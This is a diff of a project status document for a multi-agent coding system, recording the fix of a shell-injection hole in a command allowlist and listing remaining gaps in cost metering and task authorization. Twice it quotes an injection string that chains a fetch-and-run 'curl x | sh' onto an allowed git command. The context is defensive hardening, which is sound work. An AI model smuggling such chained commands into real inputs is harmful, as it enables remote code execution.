@@ -85,14 +85,25 @@ cost ceiling tripped. Verdicts and frontier-model spend always require the human
   `_lock`); **claim-before-edit** exists as transactional file leases (`workspace.py`, all-or-none);
   the repo **commits**. All three are tested.
 
-**Still owed (audited 2026-07-17 — the previous list was stale and cost a re-audit):**
-- **The legacy shell path's allowlist is theatre.** `CommandPolicy.validate` correctly rejects
-  shell control tokens on the *typed argv* path — but the legacy path checks `cmd.startswith(prefix)`
-  and hands the raw string to `subprocess.run(..., shell=True)`. `"git --version; curl x | sh"`
-  passes. Worse, the constructor defaults `allow_legacy_shell=True`; only `run_loop.py` opts out.
-  ARCHITECTURE's own threat model ("needs an allowlist before a model may populate that field") is
-  the one this doesn't meet.
+**Closed 2026-07-17 — the legacy shell path, and why it had survived.** The prefix allowlist over
+`shell=True` was never a security boundary (`"git --version; curl x | sh"` passes a
+`["git --version"]` allowlist), and Codex had already *measured* this in
+`command_policy_benchmark_v1.py` — the injection arm lands its payload, the typed-argv arm blocks
+it. The evidence sat there unacted-on for a week. The reason is the interesting part: **the unsafe
+path survived because the safe path could not do the job.** Typed `command` held a single argv, so
+`a && b` had no typed form, and 5 of the last 12 board tasks reached for an `acceptance` shell
+string to chain two programs. Flipping the default alone would have broken them.
+So: `commands` (a list of typed argvs, run in order, all must pass, `&&`-style short-circuit)
+now gives that idiom a validated home; `allow_legacy_shell` defaults to **False** in both
+executors; the `allowlist` parameter is documented in-code as a convenience filter, explicitly
+*not* a boundary. **Generalisable lesson: a dangerous path persists exactly as long as the safe
+path is less capable. Close the capability gap first, then the default can actually flip.**
+
+**Still owed:**
 - **Cost governor is elapsed seconds, not tokens/dollars.** Real metering is still owed.
+- **Nothing enforces who may `add` a task.** `board.py add` takes no writer and CLAUDE.md's
+  "Fable issues tasks" is convention, not a check. This is the remaining reachability question
+  for anything a model can populate.
 
 **Bridge hot loop (a real incident, 2026-07-17):** a corrupt `~/.codex/rules` (a NUL-filled tail
 from a killed mid-append write) made every `codex exec` exit 1 at startup. `codex_bridge.py` printed
